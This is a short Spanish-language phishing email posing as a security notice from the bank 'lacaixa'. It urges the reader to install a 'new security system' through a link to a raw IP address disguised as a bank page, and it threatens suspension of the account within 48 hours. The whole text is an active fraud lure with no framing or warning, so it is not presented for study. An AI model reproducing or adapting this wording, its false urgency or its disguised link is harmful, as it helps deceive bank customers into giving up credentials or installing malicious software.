 En lacaixa tenemos la consciencia de la necesidad de garantizar el tránsito de la información entre el banco y nuestros clientes. Por esta razón, lacaixa cuenta con las máximas medidas de seguridad para poder garantizar la confidencialidad de las comunicaciones entre el banco y el cliente. No obstante, esas medidas pueden cambiar sin notificación, con la finalidad de proteger sus datos personales. Este correo le ha sido enviado automaticamente por nuestro sistema, como notificación de los cambios efectuados en el sistema. Para seguir utilizando nuestros servicios de Banca por internet de lacaixa, debes instalar el nuevo sistema de seguridad para poder efectuar sus operaciones normalmente. Acceda al enlace que hemos puesto a su disposición pulsando [AQUÍ (http://218.28.22.77/css/abc.asp?script/templates/GCMRequest.do?page=201217113-T74h645u498n789d45364r98C7943s5H87984546)]. NOTA: Recuerde que no podrás operar en lacaixa sin instalar el sistema, es muy importante su utilización. Si la instalación no se realiza dentro de 48h su cuenta será suspendida temporalmente hasta que su registro se haya completado. Todos los Derechos Reservados 2012© lacaixa. 